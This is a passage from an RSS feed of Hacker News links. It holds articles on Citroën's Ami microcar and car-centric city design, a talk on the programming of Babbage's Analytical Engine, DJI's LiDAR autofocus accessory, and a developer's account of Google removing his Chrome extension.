<p>Citroën was also inspired by the father of mass production, the Ford Model T. Like the Model T, the Ami is only available in one color. Personalization is important to many customers though. So Citroën came up with different sticker sets that the customer can use to personalize the car.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/2faef/stickers.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Ami can be personalized with sticker sets" title="The Ami can be personalized with sticker sets" src="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/b85f6/stickers.png" srcset="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/aaa28/stickers.png 180w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/7e1e1/stickers.png 360w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/b85f6/stickers.png 720w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/2faef/stickers.png 1024w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Ami can be personalized with sticker sets</figcaption>
  </figure>
<p>This smart design philosophy continues in the interior. For example, the side windows are not electric but hinge outward. Citroën like to point out that this was inspired by the 2CV, the spiritual father of the Ami, turning it into a nostalgic feature instead of a limitation. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/9c8ce/window.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The window opens outwards like the 2CV" title="The window opens outwards like the 2CV" src="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/a8fee/window.jpg" srcset="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/35027/window.jpg 180w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/627a5/window.jpg 360w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/a8fee/window.jpg 720w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/b2ead/window.jpg 1080w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/9c8ce/window.jpg 1111w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The window opens outwards like the 2CV</figcaption>
  </figure>
<p>It is not only for cost-saving though because the space that is normally used to house the window when it is down is now a storage compartment.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/0bd34/doorspace.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The storage compartment in the door" title="The storage compartment in the door" src="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/a8fee/doorspace.jpg" srcset="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/35027/doorspace.jpg 180w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/627a5/doorspace.jpg 360w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/a8fee/doorspace.jpg 720w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/b2ead/doorspace.jpg 1080w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/0bd34/doorspace.jpg 1417w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The storage compartment in the door</figcaption>
  </figure>
<p>A big challenge for car companies today is that customers want more expensive technology to be available in the car. The adoption rate of new smartphones is high and customers expect the same level of innovation in their cars. For a cheap city car, it is impossible to provide this.
That is why the Ami does not have a center console but instead, a big smartphone mount. Like this, the Ami leverages the driver's smartphone to offer the same features as premium cars without the cost. Similarly, the car has no speakers. Instead, there is an opening in the dashboard designed to hold a Bluetooth speaker.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/533d0/interior.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The interior of the Ami" title="The interior of the Ami" src="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/a8fee/interior.jpg" srcset="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/35027/interior.jpg 180w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/627a5/interior.jpg 360w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/a8fee/interior.jpg 720w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/b2ead/interior.jpg 1080w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/533d0/interior.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The interior of the Ami</figcaption>
  </figure>
<p>The few functionalities it does have are a heater (no airconditioning), and a cheap, monochrome cluster screen that shows minimal information like speed, battery level, and time until the next charge. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/1e867/cluster.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The cluster is basic and monochrome" title="The cluster is basic and monochrome" src="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/a8fee/cluster.jpg" srcset="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/35027/cluster.jpg 180w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/627a5/cluster.jpg 360w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/a8fee/cluster.jpg 720w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/b2ead/cluster.jpg 1080w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/1e867/cluster.jpg 1268w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The cluster is basic and monochrome</figcaption>
  </figure>
<h2>Interior Space</h2>
<p>Creating a lot of interior space is a huge challenge for small city cars. Thanks to Ami's electric drivetrain, the space that is otherwise used to house the engine, gearbox, and other mechanical parts can now be used for the interior. It also means that the wheels can be placed at the outer edges of the car which not only gives it a tiny turning circle, it also maximizes the interior space. </p>
<p>The many windows of the car allow for a lot of natural light to enter the cabin which helps in making the interior feel big.
Entering the vehicle for the first time feels unreal. The car is much smaller than any other vehicle on the road. With its length of 2.41m and width of 1.29m, it is significantly smaller than a Smart Fortwo (2.69m x 1.66m). But when entering the car, the interior feels so spacious that it seems bigger than the car itself!</p>
<p>Clearly, the Ami is not meant for going on vacation so it does not need to have a big amount of storage space. It does manage to have enough interior space for the things you would bring on short trips.
Due to the packaging of the car, the dashboard reaches quite far to the front of the car. In it, there are different patterns and holders for small items like a water bottle or sunglasses. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/0bd34/dashboard.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The storage system in the dashboard" title="The storage system in the dashboard" src="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/a8fee/dashboard.jpg" srcset="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/35027/dashboard.jpg 180w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/627a5/dashboard.jpg 360w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/a8fee/dashboard.jpg 720w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/b2ead/dashboard.jpg 1080w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/0bd34/dashboard.jpg 1417w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The storage system in the dashboard</figcaption>
  </figure>
<p>An idea that directly comes from concept car is to place the passenger seat a bit further back than the driver's seat which creates a space for a backpack in the passenger's footwell.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/533d0/space.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="There is space for a backpack in the footwell" title="There is space for a backpack in the footwell" src="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/a8fee/space.jpg" srcset="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/35027/space.jpg 180w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/627a5/space.jpg 360w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/a8fee/space.jpg 720w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/b2ead/space.jpg 1080w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/533d0/space.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>There is space for a backpack in the footwell</figcaption>
  </figure>
<p>Driving the Ami around Paris, it feels more like a scooter than a car. Thanks to the many windows, you feel more exposed and connected to other road users. It is easier to make eye contact and communicate with cyclists and pedestrians so it is a much friendlier vehicle than a regular car.
Despite the cheap materials, the interior is not an unpleasant place to be. By cleverly creating space and a place for the smartphone, it provides everything you might need for a short trip. It is hard not to love it!</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/533d0/carmeet.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Thanks to its size and many windows, it is easy to make eye-contact with others" title="Thanks to its size and many windows, it is easy to make eye-contact with others" src="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/a8fee/carmeet.jpg" srcset="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/35027/carmeet.jpg 180w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/627a5/carmeet.jpg 360w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/a8fee/carmeet.jpg 720w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/b2ead/carmeet.jpg 1080w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/533d0/carmeet.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Thanks to its size and many windows, it is easy to make eye-contact with others</figcaption>
  </figure>

<p>Citroën has intended the Ami to be a car for the (urban) masses and is trying to give anyone a reason to use one. It is available to buy for around 6000 euros or rent for 20 euros per month after a down payment. Additionally, several car-sharing services will include the Ami in their fleet. It is not only available at Citroën dealerships, but also in France's big electronics retailers Fnac and Darty. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/040c5/fnac.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Ami on display at a Fnac" title="The Ami on display at a Fnac" src="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/a8fee/fnac.jpg" srcset="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/35027/fnac.jpg 180w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/627a5/fnac.jpg 360w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/a8fee/fnac.jpg 720w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/b2ead/fnac.jpg 1080w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/040c5/fnac.jpg 1200w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Ami on display at a Fnac</figcaption>
  </figure>
<p>It has a top speed of 45km/h, it can do 75km on a full charge and it takes only 3 hours to charge it in a normal 220v household plug. It is classified as a quadricycle, not a car, so anyone over 14 can legally drive the car in France without a license. </p>
<p>Citroën did not design the car for a specific target audience. But the company does want to tap into the market of families. Citroën expects that almost half of the drivers will be younger than 18. They argue that parents will prefer to have their teenage children race around the city in a vehicle that is much safer than scooters or bicycles. The price of a monthly subscription is similar to a public transportation card or scooter subscription making it an attractive alternative.
The first signs are clearly positive as there are currently waiting lines to test drive one. </p>

<p>So far so good then. The Ami is cheap, well-designed, eco-friendly, and accessible to most of the public. What is not to love? To understand my concerns, we have to dive back in time and look at the bigger picture of city transportation.</p>
<h2>A History Lesson</h2>
<p>Before cars were the main mode of transport, city streets were a place where children played football, where neighbors would run into each other and stop for a chat. They were a place where people spent time and socialized. But at some point, something changed. Paris was one of the first cities where this happened. Between 1853 and 1870 Baron Haussman transformed much of the medieval city center of Paris into a 'healthy' city. This involved tearing down much of the narrow streets to make place for wide boulevards. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/db203/oldvsnewparis.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Old streets of Paris compared to the wide boulevards" title="Old streets of Paris compared to the wide boulevards" src="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/b85f6/oldvsnewparis.png" srcset="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/aaa28/oldvsnewparis.png 180w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/7e1e1/oldvsnewparis.png 360w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/b85f6/oldvsnewparis.png 720w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/4d206/oldvsnewparis.png 1080w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/91a72/oldvsnewparis.png 1440w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/db203/oldvsnewparis.png 1580w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Old streets of Paris compared to the wide boulevards</figcaption>
  </figure>
<p>The side effect was that it allowed horse-drawn carriages to go much faster, resulting in louder, more dangerous streets.
Before, pedestrians ruled the streets and other forms of transportation had to adjust to them. After the transformation though, the wide boulevards switched this around. Check this video from 1890 where this is clearly visible:</p>
<p><iframe src="https://www.youtube.com/embed/fo_eZuOTBNc?start=107" allowfullscreen=""></iframe></p>
<p>After the Second World War, this became even worse when cars were seen as the future of personal transportation. The modernist movement turned entire city centers into highways and parking lots. Suddenly, city streets were not a social place, they were there to get traffic from A to B as quickly and efficiently as possible. Pedestrians, despite being in the majority, were delegated to narrow sidewalks, jaywalking became an offense, and most of the public space was allocated to driving or parking. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/b2ead/carcentricillustration.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The effect of car centric culture on the rest of the city" title="The effect of car centric culture on the rest of the city" src="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/a8fee/carcentricillustration.jpg" srcset="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/35027/carcentricillustration.jpg 180w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/627a5/carcentricillustration.jpg 360w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/a8fee/carcentricillustration.jpg 720w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/b2ead/carcentricillustration.jpg 1080w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The effect of car centric culture on the rest of the city</figcaption>
  </figure>
<p>Over time we have accepted this as normal but it isn't.  In <a href="https://medium.com/@colville_andersen/the-arrogance-of-space-93a7419b0278">'The Arrogance of Space'</a> Mikael Colville-Anderson describes the unfair distribution of space with Paris as an example:  </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/d4e2e/arroganceofspace.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower" title="Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower" src="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/b85f6/arroganceofspace.png" srcset="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/aaa28/arroganceofspace.png 180w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/7e1e1/arroganceofspace.png 360w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/b85f6/arroganceofspace.png 720w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/4d206/arroganceofspace.png 1080w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/91a72/arroganceofspace.png 1440w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/d4e2e/arroganceofspace.png 2306w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower</figcaption>
  </figure>
<p>With the rising importance of global climate change and more recently, the Covid crisis, cities are realizing that the current solution is unsustainable.
A country where this realization has happened a few decades ago is the Netherlands. Like other countries in the '60s, Dutch cities were moving towards car-centric infrastructure. There were plans to destroy much of the historic center of Amsterdam to make way for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/">https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/</a></em></p>]]>
            </description>
            <link>https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856541</guid>
            <pubDate>Thu, 22 Oct 2020 10:24:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The programming architecture of Babbage's Analytical Engine [video]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24856235">thread link</a>) | @doener
<br/>
October 22, 2020 | https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=Prof.+Dr.+Raul+Rojas">Prof. Dr. Raul Rojas</a>

</p>
<p>
Playlists:
<a href="https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas/playlist">'vcfb20' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas/audio">audio</a></p>
<!-- %h3 About -->
<p>The mathematician and inventor Charles Babbage wrote 26 programs between 1836 and 1841 for the unfinished "Analytical Engine" (AE). The code is embedded implicitly in tables summarizing program traces. In this talk, I present the programming architecture of Babbage’s mechanical computer based on the first code written for the machine. The AE had a processor separate from memory, and worked using a kind of dataflow approach. The stream of arithmetical operations was independent from the stream of memory addresses. Special "combinatorial" cards allowed the processor to execute FOR and WHILE loops. Combinatorial cards also allowed independent looping through the stream of memory addresses. Quite sophisticated computations were possible and illustrate why Babbage talked about the possibility of doing "algebra" with his machine. The programs I will discuss predate by several years the account published by Menabrea in 1842 and translated later by Lady Lovelace with notes of her own.</p>

<h3>Download</h3>

<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856235</guid>
            <pubDate>Thu, 22 Oct 2020 09:25:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Lidar to Add Autofocus to a Manual Focus Lens]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24856072">thread link</a>) | @giuliomagnifico
<br/>
October 22, 2020 | http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/ | <a href="https://web.archive.org/web/*/http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-13082"> 

				

					

					<!-- .entry-meta -->
     				
					<div>
					
						<p><iframe title="RS2.  Amazing Gimbal with AUTOFOCUS for any camera. New LiDAR sensor with focus motors!" width="540" height="304" src="https://www.youtube.com/embed/Y7UEHryq7zo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>DJI has a 3D focus accessory for the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">DJI RS 2</a> that allows you to autofocus any manual lens using LiDAR using what is called time of flight technology. The technology has a few limitations like it won’t autofocus beyond 4m (22ft) because there aren’t enough photons bouncing back at that distance and the system has to be calibrated for each lens. The system also won’t work with lenses that do not have a hard stop.</p>
<p>The system is pretty basic at this time and it is dumb zone AF, but this might be improved with time. The follow focus seems to work best between 1m and 4m from testing and the calibration program, which checks two distances during calibration. The gimbal can store profiles for 3 lenses so you do not have to repeat calibration every time. AF is handled completely independently of the camera and the lens is focused via <a href="https://www.bhphotovideo.com/c/product/1078023-REG/slr_magic_slr_3595m_cine_ii_e_35mm_0_95_ii_m.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">gears</a> so it will focus even with the camera off and since it uses LiDAR it will even focus in the dark. DJI also makes an accessory to <a href="https://www.bhphotovideo.com/c/product/1447215-REG/dji_cp_rn_00000026_01_ronin_s_part_19_focus.html/BI/20068/KBID/13800/">add gears to your manual focus lenses</a>.</p>
<p>The 3D focus module isn’t available yet, but it will be in a few weeks for $169 and it requires the <a href="https://www.bhphotovideo.com/c/product/1585352-REG/dji_cp_rn_00000094_01_rs_2_gimbal_stabilizer.html/BI/20068/KBID/13800/" target="_blank" rel="noopener noreferrer">focus motors and RS2</a>, but not the Ravens Eye wireless transmitter that was used in the video. If you want the setup to track you then you will need the Ravens Eye wireless transmitter. This system also makes older cameras with poor AF relevant again, which is a nice bonus.</p>
<p><strong>DJI RS 2 and RSC 2:&nbsp;</strong><a href="https://bhpho.to/3lS3D9p" target="_blank" rel="noopener noreferrer">B&amp;H Photo</a>&nbsp;/&nbsp;<a href="http://moment.8ocm68.net/Nd17P" target="_blank" rel="noopener noreferrer">shopmoment</a>&nbsp;/&nbsp;<a href="https://amzn.to/2SVaKld" target="_blank" rel="noopener noreferrer">Amazon</a>&nbsp;/&nbsp;<a href="http://adorama.rfvk.net/LvA73" target="_blank" rel="noopener noreferrer">Adorama</a></p>


												
					</div><!-- .entry-content -->
					
					<div>

						<p><span>This entry was posted in <a href="http://sonyaddict.com/category/accessories/" rel="category tag">Accessories</a></span><span> and tagged  <a href="http://sonyaddict.com/tag/dji/" rel="tag">DJI</a>, <a href="http://sonyaddict.com/tag/dji-rs-2/" rel="tag">DJI RS 2</a>, <a href="http://sonyaddict.com/tag/dji-rsc-2/" rel="tag">DJI RSC 2</a>, <a href="http://sonyaddict.com/tag/gimbal/" rel="tag">Gimbal</a>, <a href="http://sonyaddict.com/tag/lidar/" rel="tag">LiDAR</a>, <a href="http://sonyaddict.com/tag/lidar-af/" rel="tag">LiDAR AF</a>, <a href="http://sonyaddict.com/tag/lidar-autofocus/" rel="tag">LiDAR Autofocus</a></span>. Bookmark the <a title="Permalink to f/0.95 Autofocus on Any Camera With LiDAR" href="http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/">permalink</a>. Trackbacks are closed, but you can <a title="Post a comment" href="#respond">post a comment</a>.

					</p></div><!-- .entry-utility -->
					
				</div></div>]]>
            </description>
            <link>http://sonyaddict.com/2020/10/20/f-0-95-autofocus-on-any-camera-with-lidar/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856072</guid>
            <pubDate>Thu, 22 Oct 2020 08:57:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Google obliterated my 4 year old Chrome extension with 24k+ users (2016)]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 123 (<a href="https://news.ycombinator.com/item?id=24855582">thread link</a>) | @Fiveplus
<br/>
October 22, 2020 | https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18 | <a href="https://web.archive.org/web/*/https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><div><div><p>
              After 3 months of trying everything I could think of, I give up.
              I don’t think I will ever develop anything for the Google
              ecosystem again. I’m not angry, I’m not doing this out of spite.
              I just don’t think it is worth it to invest any amount of effort
              to build something on a platform that turned out to be so
              unreliable.
            </p>  <h2>Please scroll down to read the latest update.</h2>  <p>
              I started developing my first extension back in 2010, when Apple
              finally decided to implement proper extension support in Safari.
              Exciting times. I spent a weekend writing my first Safari
              Extension, an ad blocker called “Cleaner Facebook”. I must
              confess it was ugly, and by today’s standards, very poorly
              written, but it did the job.
            </p> <p>
              After a few weeks while browsing Facebook using Chrome, the
              annoying ads popped up and I figured that it’ll be worthwhile to
              port it over, so I did. I also made it available to everyone via
              <a href="http://apps.graffino.com/" target="_blank" title="App Development">Graffino’s apps playground.</a></p> <p>
              Months later the due to some policy changes in Chrome, I moved
              to the Chrome Web Store where I made it available for free under
              the name “Cleaner Facebook”.
            </p> <p>
              What happened next was beyond my wildest expectations. It
              quickly gathered around 4.000 users and over the last year it
              surged to 24.000+ users. Whenever I pushed an update, the
              numbers would spike.
            </p> <p>
              I got quite a few offers to sell it, so others could push
              advertising through it. Thing is, I never wanted to make any
              money off it and I felt like I was betraying my users. So, I
              kept it and improved it constantly. It worked so well because I
              needed it to work well, I was using it daily and my users loved
              it. It got a 5 stars rating and over 85 reviews.
            </p> <blockquote>
              Google has been notified that some of your materials allegedly
              infringe upon the trademarks of others.
            </blockquote> <p>
              At the end of May this year, I received an email from Google
              telling me that my extension violated Facebook’s trademark and
              got taken down. There was no information how to solve the issue,
              no way to appeal. Google washed its hands clean and directed all
              inquiries to an automatically generated email address. This
              email address was a black hole that never responded to any of my
              emails.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/bcfd01f.png" alt="Google's notification that they removed Graffino's Ads removal app from the store."> <figcaption>
                The original infringement and taken down notice (shortened).
              </figcaption></figure> <p>
              I figured out that the name might be an issue although there
              were
              <a href="https://chrome.google.com/webstore/search/facebook?hl=en-US" target="_blank">a lot of other extensions</a>
              with the same name in the store. Even so, I changed the name of
              my extension to “Cleaner — for Facebook” and resubmitted it to
              the store where it got placed “In review”.
            </p> <p>
              Over the next weeks I never received any email from the Chrome
              Store other than the initial take down notice. When I logged in
              again, I found my extension was still “Taken down” and the “In
              review” flag gone.
            </p> <p>
              I went on to search for a Developer Support page, but after half
              an hour of searching I found out that there is none. There is no
              support whatsoever for the developer besides Google’s own
              documentation. If you encounter an issue that you can’t solve
              yourself, you’re stranded. There’s no contact info. No one to
              write to.
            </p> <p>
              After getting really frustrated that day, I vented out sending
              out a nasty email to removals@google.com. Not sure it helped.
            </p> <p>
              The next day I poked around and found a support form intended
              for Chrome Web Store users. In my desperation I figured this was
              my only option left.
            </p> <p>
              About a week later, I got my first reply from <em>Google</em>.
              Although it sounded nice, it wasn’t really helpful. Most
              probably due to the fact it was a canned response, totally
              unrelated to my issue.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/a38f41d.png" alt="Google's first email response to Graffino's complaint."> <figcaption>First canned response</figcaption></figure> <p>
              Later that day, I fired a few other emails, telling them that my
              extension was not under review and the cause for the take down
              was not flagging. I also submitted another message via the
              support form I used before. My requests got closed with a
              <em>“Thanks for your feedback.”</em> canned response.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/c1a157e.png" alt="Google's first email response to Graffino's complaint."> <figcaption>“Thank you for your feedback” response</figcaption></figure> <p>
              Meanwhile my extension’s user base was dwindling, and I could do
              absolutely nothing about it.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/ee3fd6a.png" alt="Google's first email response to Graffino's complaint."> <figcaption>
                Screenshot from the Developer Dashboard made on the 18th of
                July.
              </figcaption></figure> <p>
              After another two weeks I finally gave up and sent this final
              email. I got a reply that my case was “Reopened”. It’s been a
              month and I didn’t hear back since, so I don’t think I will ever
              get my extension back on the store.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              I’m not playing the victim here, and I don’t expect this post to
              solve anything for my extension. I just want you to think twice
              before creating a revenue stream based on the Chrome Web Store.
            </p> <p>
              Google has great automated tools and services, to help
              developers ramp up and deliver their apps to users quickly and
              painless. Most of the time these tools work perfectly. The
              problems arise when they don’t.
            </p> <p>
              I have never experienced such frustration, and such feelings of
              helplessness from any other major player out there. A similar
              issue with the
